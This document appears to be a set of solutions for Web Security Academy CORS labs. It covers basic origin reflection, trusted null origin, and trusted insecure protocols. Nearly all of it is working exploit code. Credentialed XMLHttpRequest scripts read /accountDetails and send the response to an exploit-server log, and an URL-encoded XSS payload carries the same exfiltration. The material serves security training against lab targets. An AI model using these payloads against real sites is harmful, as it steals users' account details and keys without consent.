## 1. CORS vulnerability with basic origin reflection

```html
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://0a60009e03d6438180bbf31e00fa0095.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?text='+this.responseText;
   };
</script>
```

## 2. CORS vulnerability with trusted null origin

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://0ad6000c040dd78781eb430f00a200f9.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://exploit-0a5d00ac04f5d75c81f242b5016000a0.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```


## 3. CORS vulnerability with trusted insecure protocols

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0aef00660498f1a3807a8acb003500b5.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://exploit-0a36000f0415f17380178907010300b1.exploit-server.net/log?text='+this.responseText;
    };
</script>
```

```html
<script>
    location = "http://stock.0aef00660498f1a3807a8acb003500b5.web-security-academy.net/?productId=1%3Cscript%3E%0A%20%20%20%20var%20req%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20%20%20req.onload%20%3D%20reqListener%3B%0A%20%20%20%20req.open(%27get%27%2C%27https%3A%2F%2F0aef00660498f1a3807a8acb003500b5.web-security-academy.net%2FaccountDetails%27%2Ctrue)%3B%0A%20%20%20%20req.withCredentials%20%3D%20true%3B%0A%20%20%20%20req.send()%3B%0A%0A%20%20%20%20function%20reqListener()%20%7B%0A%20%20%20%20%20%20%20%20location%3D%27https%3A%2F%2Fexploit-0a36000f0415f17380178907010300b1.exploit-server.net%2Flog%3Ftext%3D%27%2Bthis.responseText%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&storeId=1";
</script>
```
